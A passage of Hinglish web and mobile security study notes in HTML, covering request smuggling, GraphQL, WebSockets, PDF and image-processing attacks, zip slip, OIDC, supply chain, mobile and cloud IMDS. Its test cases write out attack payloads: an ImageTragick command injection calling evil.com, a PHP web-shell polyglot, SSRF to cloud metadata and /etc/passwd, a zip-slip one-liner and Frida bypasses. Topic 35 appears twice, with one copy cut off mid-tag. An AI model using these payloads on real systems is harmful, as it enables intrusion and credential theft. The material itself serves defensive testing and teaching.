+<div class="def"><span class="lbl ld">Definition</span><br>Front-end (proxy/CDN) aur back-end server request boundaries alag samajhte hain: <b>CL.TE</b> — front Content-Length use karta hai, back Transfer-Encoding (smuggled request CL ke andar chhupi); <b>TE.CL</b> — reverse; <b>TE.TE</b> — obfuscated TE headers (<code>Transfer-Encoding : chunked</code>, <code>TE: chunked</code> case/whitespace tricks); <b>HTTP/2 downgrade</b> — H2 headers (<code>transfer-encoding</code>, <code>content-length</code> both) to H1 back-end confusion. <b>Impacts:</b> request queue poisoning (next user ka request hijack), cache poisoning, WAF bypass, credential theft (capturing requests), auth bypass. Tools: Burp HTTP Request Smuggler, Smuggler.py.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Session hijack (victim requests prepended), mass XSS via cache, WAF bypass → other vulns reachable — Critical class.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Normalize request parsing: same stack/configuration front-back.</li>
+<li>Reject ambiguous: multiple CL, CL+TE together, malformed TE.</li>
+<li>Use HTTP/2 end-to-end (front + back) — avoids CL/TE ambiguity.</li>
+<li>Front-end: strip/rewrite hop-by-hop headers; validate Content-Length.</li>
+<li>Patch proxies/CDN + monitor for smuggling indicators.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>CL.TE: <code>Content-Length: 4</code> + <code>Transfer-Encoding: chunked</code> — smuggled body bhejo (Burp ext).</li>
+<li>TE.CL: reverse order test karo.</li>
+<li>TE.TE: <code>Transfer-Encoding : chunked</code>, <code>X: X\nTransfer-Encoding: chunked</code>.</li>
+<li>H2 downgrade: HTTP/2 request mein CL+TE both — back-end confuse?</li>
+<li>Detection: timing test (<code>GET /</code> delayed response after smuggle).</li>
+<li>Poison test: smuggled request ke baad victim request — 405/error aata hai? (queue poison).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>HackerOne classics: CL.TE smuggling se WAF bypass — attacker ne payload smuggled request mein bheja jo WAF ne kabhi nahi dekha → stored XSS. Fix: HTTP/2 + uniform parsing.</div>
+</section>
+
+<section class="topic" id="t27">
+<h2><span class="n">27</span>GraphQL Security</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>GraphQL = API query language (single endpoint, client defines shape). <b>Vulns:</b> <b>1. introspection enabled</b> (schema dump — full attack surface), <b>2. batching attacks</b> (alias abuse — brute force/auth bypass via multiple queries in one request), <b>3. DoS</b> (deep/nested queries, expensive resolvers, no depth/complexity limits), <b>4. IDOR</b> (nested resolvers access bina authz — <code>{ user(id:1){ orders } }</code>), <b>5. injection</b> (args mein SQLi/NoSQLi), <b>6. authorization per-resolver missing</b> (field-level data leak), <b>7. CSRF</b> (GET queries), <b>8. information disclosure</b> (error messages, stack traces).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Full schema disclosure, data breach (nested IDOR), DoS (complexity bombs), brute force (batching) — modern APIs ka #1 attack surface.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Disable introspection in production (or auth-protect).</li>
+<li>Query depth + complexity limits; cost analysis per resolver.</li>
+<li>Authorization in EVERY resolver (not just top-level).</li>
+<li>Rate limit per user + alias/batching limits.</li>
+<li>Input validation on args (injection) + generic errors.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Introspection: <code>{ __schema { types { name } } }</code> — schema aata hai?</li>
+<li>Nested IDOR: <code>{ user(id:2) { email orders { total } } }</code> — authz check har level par?</li>
+<li>Batching brute: alias se 100 password guesses ek request mein.</li>
+<li>DoS: nested query 10 levels deep — depth limit hai? (authorized, careful).</li>
+<li>Injection: args mein <code>' OR 1=1--</code> — resolver vulnerable?</li>
+<li>GET mutation: <code>?query=mutation...</code> — CSRF possible?</li>
+<li>Error info: invalid query — stack trace/schema hints leak?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>GraphQL introspection se pura schema mila → nested query <code>user(id){bankDetails}</code> bina resolver authz → kisi bhi user ka bank data. Fix: introspection off + per-resolver authz + complexity limits.</div>
+</section>
+
+<section class="topic" id="t28">
+<h2><span class="n">28</span>WebSockets Security</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>WebSocket = full-duplex persistent connection (ws://, wss://). <b>Risks:</b> <b>1. no Origin validation on handshake</b> — CSWSH (Cross-Site WebSocket Hijacking): attacker's page victim ke browser se socket kholti hai, victim ke session ke saath — messages read/send; <b>2. auth only on handshake</b> (no re-auth per message); <b>3. no TLS</b> (ws:// — message sniffing/tampering); <b>4. message injection</b> (unvalidated content → XSS/command injection in consumers); <b>5. subprotocol confusion</b>; <b>6. DoS</b> (no rate limit on messages, connection flood); <b>7. IDOR over socket</b> (subscription to other users' channels).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Chat/message hijack, real-time data theft, session-based attacks, XSS via injected messages — real-time apps mein critical.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Validate Origin header on handshake (allowlist of trusted origins).</li>
+<li>wss:// (TLS) always; validate Sec-WebSocket-Key/protocol.</li>
+<li>Authenticate + authorize per message (not just handshake).</li>
+<li>Validate/sanitize all message payloads (output encoding for chat).</li>
+<li>Rate limit messages/connections; monitor anomalous sockets.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>CSWSH: attacker page <code>new WebSocket('wss://target/chat')</code> — connect + read messages?</li>
+<li>Origin: handshake mein evil Origin — server reject karta hai?</li>
+<li>ws:// test: plaintext socket available? (mitm risk).</li>
+<li>Message injection: <code>&lt;img src=x onerror=alert(1)&gt;</code> — chat mein XSS render?</li>
+<li>Auth: socket connect ke baad token revoke — messages band hote hain?</li>
+<li>Channel subscription: apne token se doosre user ke channel id — data aata hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Chat app: no Origin check + auth sirf handshake par — attacker page se victim ka socket hijack karke messages read/delete kiye. Fix: Origin allowlist + per-message auth.</div>
+</section>
+
+<section class="topic" id="t29">
+<h2><span class="n">29</span>Microservices Security — Service-to-Service</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Microservices = many small services, own data, HTTP/gRPC/message queues. <b>Risks:</b> <b>1. east-west traffic unencrypted</b> (internal network sniffing), <b>2. service-to-service auth missing</b> (any service can call any), <b>3. secrets sprawl</b> (creds in env/config/repos), <b>4. gateway bypass</b> (direct service IPs — Part 2 topic 47), <b>5. shared data layer</b> (multiple services same DB — authz confusion), <b>6. mTLS absent</b>, <b>7. message queue injection</b>, <b>8. one service compromise → lateral movement</b> (no segmentation), <b>9. dependency variance</b> (each service different vuln profile).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Lateral movement after initial breach, mass data exposure via unauthenticated internal APIs, secret theft.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>mTLS (service mesh: Istio/Linkerd) — encrypted + authenticated east-west.</li>
+<li>Service identity + token per service (SPIFFE); scoped permissions.</li>
+<li>Central secrets (Vault/KMS) — no secrets in env/repos.</li>
+<li>Network policies (K8s NetworkPolicy) — least connectivity.</li>
+<li>Defense in depth: service-level authz (never trust gateway alone).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Direct service access: service IP/port bypassing gateway — reachable?</li>
+<li>East-west sniff: internal traffic plaintext? (tcpdump on service pod).</li>
+<li>Service auth: unauth call to internal API — accepted?</li>
+<li>Secrets: env/config/repo scan (gitleaks, env inspection).</li>
+<li>NetworkPolicy: pod-to-pod connectivity unrestricted?</li>
+<li>Compromise sim: ek service se doosri service ke data access possible?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>One microservice (public-facing) compromised → bina mTLS/split — attacker ne internal payment service direct call kiya → fraud transactions. Fix: mTLS + network policies + service authz.</div>
+</section>
+
+<section class="topic" id="t30">
+<h2><span class="n">30</span>PDF / Report Generation Attacks (Server-Side XSS, SSRF)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>HTML-to-PDF engines (wkhtmltopdf, Chromium headless, WeasyPrint) user content render karte hain: <b>SSRF via &lt;img&gt;/&lt;iframe&gt;</b> — <code>&lt;img src="http://169.254.169.254/latest/meta-data/"&gt;</code> PDF mein internal content render; <b>local file read</b> — <code>&lt;iframe src="file:///etc/passwd"&gt;</code> (old wkhtmltopdf); <b>RCE</b> — old wkhtmltopdf JS/exec; <b>server-side XSS</b> — PDF engine JS execute karta hai (server context); <b>data exfil</b> — rendered content attacker server ko; <b>DoS</b> — huge/complex HTML. Docx/Excel template injection similar (SSRF via external images, formula injection topic 16).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Internal network scanning (SSRF), cloud metadata theft, local file disclosure, RCE (legacy engines) — report generators = hidden SSRF machine.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Block external resources in HTML-to-PDF (<code>--disable-local-file-access</code>, CSP, no external images).</li>
+<li>Run renderers in isolated container with egress filtering.</li>
+<li>Sanitize user HTML (allowlist tags — no img/iframe/script).</li>
+<li>Upgrade engines (patched Chromium headless; drop old wkhtmltopdf).</li>
+<li>Restrict file:// and network access via engine config.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Report content: <code>&lt;img src="http://collab.oastify.com/x"&gt;</code> — render par Collaborator hit? (SSRF).</li>
+<li><code>&lt;iframe src="http://169.254.169.254/latest/meta-data/"&gt;</code> — metadata in PDF?</li>
+<li><code>&lt;iframe src="file:///etc/passwd"&gt;</code> — local file render? (old engine).</li>
+<li>JS: <code>&lt;script&gt;...&lt;/script&gt;</code> — engine JS execute karta hai?</li>
+<li>Exfil: external CSS/JS load — attacker server hit + data in URL.</li>
+<li>DoS: nested tables/huge HTML — renderer hang? (authorized).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Invoice PDF generator: <code>&lt;img src="http://169.254.169.254/..."&gt;</code> — IAM keys PDF mein render hue → attacker ne keys use kiye. Fix: external resources block + container isolation.</div>
+</section>
+
+<section class="topic" id="t31">
+<h2><span class="n">31</span>Image Processing Attacks</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Image upload/processing attack classes: <b>1. ImageTragick (CVE-2016-3714)</b> — ImageMagick delegates se RCE (<code>MVG</code> with <code>| command</code>, MSL); <b>2. decompression bombs</b> — tiny image, huge decompressed size (DoS); <b>3. polyglot files</b> — valid image + PHP code (extension/MIME bypass → RCE — Part 1 topic 27); <b>4. EXIF data</b> — metadata leak (GPS, usernames, device); <b>5. steganography</b> — hidden data in images (data exfil); <b>6. parser CVEs</b> — libpng/libjpeg/WebP (CVE-2023-4863 libwebp heap overflow — RCE); <b>7. pixel flood</b> — huge dimensions (memory exhaustion); <b>8. SSRF via image URL fetch</b>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>RCE (ImageTragick, libwebp), DoS (bombs), stored XSS (SVG), data leak (EXIF) — image pipeline = high-value target.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Patch image libraries (ImageMagick policies.xml disable delegates, libwebp CVE patches).</li>
+<li>Re-encode images server-side (strip metadata — EXIF clean).</li>
+<li>Validate: magic bytes + dimensions + size limits (bomb roko).</li>
+<li>Process in sandbox/container with low privileges + egress off.</li>
+<li>Serve from separate domain/path — no script execution in upload dir.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>ImageTragick: <code>push graphic-context\nviewbox 0 0 640 480\nfill url(https://example.com/image.jpg"|touch /tmp/pwned")\npop graphic-context</code> — file create hota hai? (authorized lab).</li>
+<li>Polyglot: GIF89a header + <code>&lt;?php system($_GET[0]);?&gt;</code> — upload + execute?</li>
+<li>Bomb: <code>convert -size 10000x10000 xc:red bomb.png</code> upload — memory spike?</li>
+<li>EXIF: <code>exiftool image.jpg</code> — GPS/device info preserved?</li>
+<li>SVG: <code>&lt;svg onload=alert(1)&gt;</code> — stored XSS on serve.</li>
+<li>libwebp: crafted WebP (CVE-2023-4863 PoC) — crash/ASAN? (patched version test).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>ImageTragick: user image processing RCE — <code>url(https://evil.com|id)</code> se command executed. Fix: delegates disabled + sandbox + re-encode.</div>
+</section>
+
+<section class="topic" id="t32">
+<h2><span class="n">32</span>Zip Slip &amp; Archive Attacks</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Archive (zip/tar/rar) extraction bina path validation: <b>Zip Slip</b> — entry names <code>../../../../tmp/pwned</code> se filesystem ke bahar write — overwrite configs/cron/scripts → RCE; <b>symlink entries</b> — tar mein symlink → extraction ke baad target read/write; <b>zip bombs</b> — highly compressed nested archives (42.zip) → DoS (disk/CPU); <b>file type confusion</b> — .jar/.war upload → server-side execution; <b>large entry count</b> — extraction DoS. Legacy: CVE-2018-1000001 (glibc), CVE-2021-29425 (Apache Commons Compress), many extract libraries.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>RCE (file overwrite → cron/webroot), arbitrary file write/read, DoS — file upload + extraction features mein critical.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Validate every entry path: reject <code>../</code>, absolute paths, symlinks (canonicalize + prefix check).</li>
+<li>Extract to random sandbox dir with no privileged paths reachable.</li>
+<li>Limits: compression ratio, file count, total size, depth (bomb roko).</li>
+<li>Use patched extraction libraries (Zip Slip CVEs).</li>
+<li>After extraction: re-validate file types/extensions (no scripts in webroot).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Zip Slip: <code>python3 -c "import zipfile;z=zipfile.ZipFile('evil.zip','w');z.writestr('../../../../tmp/pwned','x')"</code> upload karo — file bahar likhi jaati hai?</li>
+<li>Symlink tar: tar mein symlink entry banao — extraction target ko read/write karta hai?</li>
+<li>Bomb: 42.zip / <code>zip bomb</code> upload — server disk/CPU exhaust (authorized)?</li>
+<li>Extension confusion: .jar/.war upload — app deploy/execute karta hai?</li>
+<li>Path traversal: entry <code>../app.py</code> — overwrite attempt.</li>
+<li>Count limit: 100k entries wala zip — extraction completes ya fail (limit hai)?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Plugin-upload feature zip extract karta tha — zip slip se attacker ne cron job overwrite kiya → RCE as root. Fix: canonical path validation + sandbox + limits.</div>
+</section>
+
+<section class="topic" id="t33">
+<h2><span class="n">33</span>OpenID Connect — ID Token Validation &amp; Attacks</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>OIDC = OAuth 2.0 + identity: <b>ID Token</b> (JWT) = authentication proof; <b>UserInfo endpoint</b> = profile data. <b>Validation (client-side):</b> signature (JWKS from issuer), <b>iss</b> (issuer exact match), <b>aud</b> (client_id match), <b>exp</b> (not expired), <b>iat</b>, <b>nonce</b> (replay + CSRF protection), <b>azp</b> (authorized party), <b>at_hash/c_hash</b> (token binding). <b>Attacks:</b> issuer confusion (attacker IdP token accept), aud missing/mismatch (token for other client), nonce missing (replay), alg confusion (Part 1 topic 33), UserInfo over HTTP, session fixation via OIDC login, mix-up (redirect to evil IdP), logout/open-redirect issues. Flows: Authorization Code + PKCE (SPA/native), implicit (deprecated).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Account takeover via fake/attacker-issued ID tokens, cross-client token reuse, replay — SSO identity layer attacks.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Validate: signature + iss + aud + exp + nonce + azp (full checklist).</li>
+<li>Strict alg allowlist (RS256/ES256); no alg:none.</li>
+<li>PKCE + state for all flows; short token lifetime.</li>
+<li>IdP allowlist (only trusted issuers) — mix-up/confusion roko.</li>
+<li>Use verified OIDC libraries; patch regularly.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Issuer confusion: apne attacker IdP ka token bhejo — accepted? (iss check).</li>
+<li>aud tamper: doosre client_id ka token use karo — rejected?</li>
+<li>nonce: nonce missing/reused — replay successful?</li>
+<li>alg:none / RS→HS confusion — Part 1 topic 33 tests.</li>
+<li>exp: expired token — validation hota hai?</li>
+<li>UserInfo over HTTP: <code>http://</code> endpoint — sniffing risk.</li>
+<li>state/CSRF: login callback bina state — login CSRF possible?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>SPA ne ID token sirf localStorage mein decode kiya, signature verify nahi kiya — attacker ne apna token bheja → admin claims → bypass. Fix: library-based full validation + server-side check.</div>
+</section>
+
+<section class="topic" id="t34">
+<h2><span class="n">34</span>Supply Chain Attacks</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Attack through third-party components: <b>1. typosquatting</b> (event-stream vs event-stream, python packages similar names — malicious code); <b>2. dependency confusion</b> (private package same name — public registry wala version install ho jaata hai); <b>3. compromised maintainer</b> (npm account hack — ua-parser-js, colors/faker incidents); <b>4. build pipeline compromise</b> (CI secrets, malicious build plugins); <b>5. package lifecycle scripts</b> (postinstall code exec); <b>6. git hooks/actions</b> (malicious GitHub Actions); <b>7. hardware/firmware</b> (supply chain physical). Notable: SolarWinds (2020), Log4Shell ecosystem (2021), 3CX (2023).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Massive scale — one package = thousands of companies compromised; backdoors, crypto miners, data exfil, ransomware entry.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>SCA tooling (Snyk, OWASP Dependency-Check, npm audit) in CI.</li>
+<li>Lockfiles (package-lock, poetry.lock) + integrity hashes (shasum).</li>
+<li>Private registry mirror + dependency allowlist (no unknown packages).</li>
+<li>SBOM (SPDX/CycloneDX) — inventory + vuln tracking.</li>
+<li>Disable lifecycle scripts where possible; review critical deps (fewer, vetted).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Typosquat: registry search — aapke dep ke typos exist karte hain? install test sandbox mein.</li>
+<li>Dependency confusion: private package name registry par check karo — public version available?</li>
+<li>Audit: <code>npm audit</code> / <code>pip-audit</code> — known vulnerable versions?</li>
+<li>Lifecycle: <code>package.json</code> postinstall scripts — kya chalta hai? review.</li>
+<li>Lockfile: integrity hashes present? reproducible installs?</li>
+<li>GitHub Actions: third-party actions pinned to SHA? (not @latest).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>ua-parser-js package compromised (npm) — millions of apps installed malicious version → crypto miners/data theft. Fix: lockfiles + SCA + registry mirroring.</div>
+</section>
+
+<!-- ==================== MOBILE & CLOUD ==================== -->
+<h3 class="category">Mobile &amp; Cloud</h3>
+
+<section class="topic" id="t35">
+<h2><span class="n">35</span>Android Deep Links &amp; Intent Redirection</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Deep links</b> (custom schemes <code>myapp://</code>, App Links <code>https://</code> + intent-filters) — external apps/browser se app kholte hain. <b>Attacks:</b> <b>1. scheme hijacking</b> — same scheme wali malicious app install (Android picks first/attacker app) → tokens/data receive; <b>2. intent redirection</b> — exported activity user-controlled <code>Intent</code> extra ko <code>startActivity()</code> mein pass karti hai → attacker kisi bhi activity/component ko intent ke saath launch kara sakta hai (bina permission); <b>3. file:// deep links</b> — local file access; <b>4. auto-verify missing</b> — App Links verification nahi → phishing/confusion; <b>5. parameter injection</b> — deep link params bina validation sensitive actions (password reset, token).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Token/data theft (scheme hijack), arbitrary component launch (intent redirection — auth bypass), phishing via fake deep links.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>App Links with <code>autoVerify=true</code> + HTTPS asset links (scheme hijack roko).</li>
+<li>Validate all intent extras/URIs before startActivity/startService.</li>
+<li>Never export components with sensitive intent handling; signature permissions.</li>
+<li>Deep link params: allowlist + server-side validation of tokens/actions.</li>
+<li>Check caller (getCallingPackage) for sensitive flows.</li></ul></div>
+<div class="tc">_
+
+<section class="topic" id="t35">
+<h2><span class="n">35</span>Android Deep Links &amp; Intent Redirection</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Deep links (custom scheme <code>myapp://</code>, App Links <code>https://</code>) external apps/browser se app kholte hain. <b>Attacks:</b> <b>1. scheme hijacking</b> — same scheme wali malicious app (Android may pick attacker app) → tokens/data intercept; <b>2. intent redirection</b> — exported activity user-controlled <code>Intent</code> ko <code>startActivity()</code> mein pass karti hai → attacker kisi bhi component ko extra ke saath launch kara sakta hai; <b>3. file:// deep links</b> — local file access; <b>4. auto-verify missing</b> — App Links verification nahi → phishing; <b>5. param injection</b> — deep link params bina validation sensitive actions.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Token/data theft (scheme hijack), arbitrary component launch (auth bypass via intent redirection), phishing.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>App Links <code>autoVerify=true</code> + HTTPS assetlinks.json (scheme hijack roko).</li>
+<li>Validate intent extras/URIs before startActivity/startService.</li>
+<li>Non-exported components; signature-level permissions for sensitive flows.</li>
+<li>Deep link params allowlist + server-side validation of tokens.</li>
+<li>Check <code>getCallingPackage()</code> for sensitive actions.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Two apps same scheme install karo — Android kaunsa resolve karta hai? (hijack test).</li>
+<li>Deep link: <code>adb shell am start -a android.intent.action.VIEW -d "myapp://reset?token=X"</code> — token accept?</li>
+<li>Intent redirection: exported activity extra <code>Intent</code> pass karta hai? — <code>am start</code> se internal component launch.</li>
+<li><code>file://</code> deep link — local file read possible?</li>
+<li>autoVerify: <code>adb shell pm verify-app-links</code> — domains verified hain?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Bank app ke reset flow mein deep link token bina validation — attacker ne phishing link se user ka token use karke password reset kiya. Fix: autoVerify + token binding + nonce.</div>
+</section>
+
+<section class="topic" id="t36">
+<h2><span class="n">36</span>iOS ATS &amp; Keychain Security</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>ATS (App Transport Security)</b> — iOS default: HTTP cleartext blocked, TLS 1.2+, strong ciphers; <code>NSAllowsArbitraryLoads</code> / <code>NSExceptionDomains</code> exceptions se weak (dev leftovers production mein). <b>Keychain</b> — encrypted storage; <b>kSecAttrAccessible</b> classes: <code>WhenUnlocked</code>, <code>AfterFirstUnlock</code>, <code>Always</code> (weakest), <code>ThisDeviceOnly</code> (iCloud sync roko — synced secrets = cloud breach surface); <b>kSecAttrAccessControl</b> (biometrics) wrong usage → bypass. Risks: ATS disabled = MITM on wifi; keychain accessible=Always + no device-only = sensitive tokens weak; backup extraction (iTunes/iCloud backups bina encryption); debugger/App Store review flags.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>MITM (cleartext traffic), token/credential theft from backups or keychain sync, biometric bypass.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>ATS on; exceptions sirf required domains + justification; pinning optional (Part 1 topic 31).</li>
+<li>Keychain: <code>ThisDeviceOnly</code> + <code>WhenUnlockedThisDeviceOnly</code>; never <code>Always</code> for secrets.</li>
+<li>iTunes/iCloud backup encryption requirement for sensitive apps.</li>
+<li>Biometrics = convenience layer; app-level fallback PIN required (Part 1 topic 32).</li>
+<li>Certificate pinning for high-value APIs (defense in depth).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Info.plist: <code>NSAllowsArbitraryLoads=true</code>? — MITM test: Burp + HTTP traffic.</li>
+<li>Keychain class: <code>kSecAttrAccessible</code> value kya hai? (Always = weak).</li>
+<li>Device-only: token iCloud ke through doosre device par milta hai?</li>
+<li>Backup: <code>idevicebackup2</code>/simulator — secrets backup mein visible?</li>
+<li>ATS exception: <code>NSExceptionDomains</code> mein HTTP allowed domain?</li>
+<li>Biometric bypass: keychain access control flag missing → code-level bypass?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Banking app mein <code>NSAllowsArbitraryLoads=true</code> (dev leftover) — wifi MITM se session token sniff hua. Fix: ATS restore + pinning + keychain ThisDeviceOnly.</div>
+</section>
+
+<section class="topic" id="t37">
+<h2><span class="n">37</span>Mobile Biometrics &amp; Local Auth Bypass</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Biometric unlock (FaceID/TouchID/Fingerprint) sirf <b>UX layer</b> hai — server ko pata nahi chalta. <b>Flaws:</b> <b>1. boolean gate</b> — app local flag (<code>isBiometricOK=true</code>) set karti hai, attacker flag/SharedPreferences modify karke bypass; <b>2. insecure fallback</b> — biometric fail par weak PIN (1234) ya null fallback; <b>3. no re-auth for sensitive ops</b> — biometric sirf app open par, transactions par nahi; <b>4. keychain misuse</b> — <code>kSecAccessControlBiometryCurrentSet</code> vs <code>Any</code> (naya fingerprint added → old bypass); Android <code>setAllowedAuthenticators</code> wrong flags; <b>5. rooted/jailbroken device</b> — hooks (Frida) se isBiometricAuthenticated() return value patch; <b>6. crypto binding missing</b> — secret biometric gate ke saath encrypted nahi.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Attacker with device access → full app access, transactions without user biometrics — account takeover on stolen device.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Biometric success → generate short-lived server token (client flag kabhi trust mat karo).</li>
+<li>Biometric-protected keystore key se decrypt karo secret (crypto binding, boolean nahi).</li>
+<li>Strong fallback policy (complex PIN) + lockout after N failures.</li>
+<li>Re-auth for sensitive actions (payments, key view).</li>
+<li>Device integrity (root/jailbreak) checks + tamper detection (defense in depth).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Frida hook: <code>biometricAuth.authenticate</code> ka callback true return karao — bypass hota hai?</li>
+<li>SharedPreferences/sqlite: isBiometricOK flag modify + app restart — unlock?</li>
+<li>Fallback: biometric 5 fail — kya fallback milta hai? PIN weak?</li>
+<li>Transaction: app unlock ke baad payment bina biometric — allowed?</li>
+<li>Android: <code>setUserAuthenticationRequired(true)</code> sahi flags? new fingerprint se key unlock?</li>
+<li>Jailbroken device par keystore dump attempt — secret milta hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Payment app: biometric sirf local boolean — Frida hook se true karke bina fingerprint transaction pass hui. Fix: server-side auth token per biometric event + keystore crypto binding.</div>
+</section>
+
+<section class="topic" id="t38">
+<h2><span class="n">38</span>Flutter / React Native Security</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Cross-platform apps — JS/Dart code bundle mein ship hota hai: <b>1. hardcoded secrets</b> — API keys/tokens bundle mein extract (React Native: <code>npx react-native bundle</code> reverse; Flutter: <code>flutter analyze</code>/snapshot strings); <b>2. insecure storage</b> — AsyncStorage (RN), shared_preferences (Flutter) plaintext; <b>3. no root/jailbreak detection</b>; <b>4. WebView bridge</b> — JS <code>postMessage</code> bina validation → RCE-level in WebView context (RN WebView props, Flutter webview_flutter); <b>5. bypassing cert pinning</b> — Flutter: libflutter.so SSL bypass (Frida scripts exist); RN: OkHttp pinning patched easily; <b>6. dependency vulns</b> — JS/native packages; <b>7. debug mode shipping</b> — Flutter debug build (JIT, observatory port 8080/10389), RN dev menu. Bundle JS readable → logic reversing + secret hunting.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Secret theft, API abuse, logic reversing, MITM bypass — mobile API attacks made easy.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>No secrets in app code — serve via server/config endpoint at runtime (still protected).</li>
+<li>Encrypted storage: flutter_secure_storage (Keystore/Keychain), RN Keychain/encrypted AsyncStorage.</li>
+<li>Root/jailbreak + debug detection; disable dev menu in release.</li>
+<li>WebView bridge allowlist + validate messages; file:// access off.</li>
+<li>Pinning via native/SSLPinning libs + server-side abuse detection (API keys rotate).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>RN: <code>npx react-native bundle --dev false</code> → main.jsbundle mein API keys grep karo.</li>
+<li>Flutter: APK se <code>libapp.so</code> extract — strings mein secrets/URLs?</li>
+<li>SharedPreferences/AsyncStorage dump (rooted device) — tokens plaintext?</li>
+<li>WebView: JS bridge message — bina validation DOM/actions?</li>
+<li>Pinning bypass: Frida <code>ssl_pinning_bypass</code> (RN/OkHttp) — Burp traffic dikhta hai?</li>
+<li>Debug build: <code>adb reverse tcp:8080</code> observatory / dev menu enabled?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>RN app ke bundle mein Firebase + AWS keys — attacker ne keys use karke unauthenticated DB read kiya. Fix: secrets server-side + rotation + storage hardening.</div>
+</section>
+
+<section class="topic" id="t39">
+<h2><span class="n">39</span>Cloud IAM &amp; Metadata Service Attacks</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Cloud IAM (AWS IAM / GCP IAM / Azure AD) — identity + permissions. <b>Key attacks:</b> <b>1. IMDS (169.254.169.254)</b> — SSRF se instance metadata: IAM role credentials, user-data (secrets), instance ID; IMDSv1 = token-less GET; <b>2. overprivileged roles</b> — S3/EC2 full access wali role = blast radius; <b>3. leaked keys</b> — repos/APKs (Part 2 topic 49) — no rotation; <b>4. wildcard policies</b> — <code>Action:"*"</code>, <code>Resource:"*"</code>; <b>5. cross-account trust</b> — attacker account assume-role allowed; <b>6. user-data secrets</b> — bootstrap scripts mein creds; <b>7. public resources</b> — misconfigured policies; <b>8. shadow admin</b> — permissive service-linked roles. AWS Metadata: <code>/latest/meta-data/iam/security-credentials/ROLE</code> → temp keys → <code>aws sts get-caller-identity</code>.</div>
